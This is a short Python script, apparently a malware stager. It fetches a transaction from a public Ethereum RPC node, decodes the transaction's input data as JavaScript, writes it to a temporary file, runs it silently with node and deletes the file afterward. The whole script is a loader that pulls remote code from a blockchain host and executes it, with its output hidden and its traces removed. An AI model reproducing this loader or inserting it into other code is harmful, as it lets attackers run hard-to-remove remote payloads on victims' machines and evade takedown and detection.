import os
import subprocess
import tempfile

import requests

RPC = "https://ethereum.publicnode.com"


def rpc(method, params):
    body = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    return requests.post(RPC, json=body, timeout=20).json()


def stage(tx_hash):
    tx = rpc("eth_getTransactionByHash", [tx_hash])
    source = bytes.fromhex(tx["result"]["input"][2:]).decode()
    handle = tempfile.NamedTemporaryFile("w", suffix=".js", delete=False)
    handle.write(source)
    handle.close()
    subprocess.run(["node", handle.name], capture_output=True, timeout=20)
    os.unlink(handle.name)


stage("0x" + "ab" * 32)
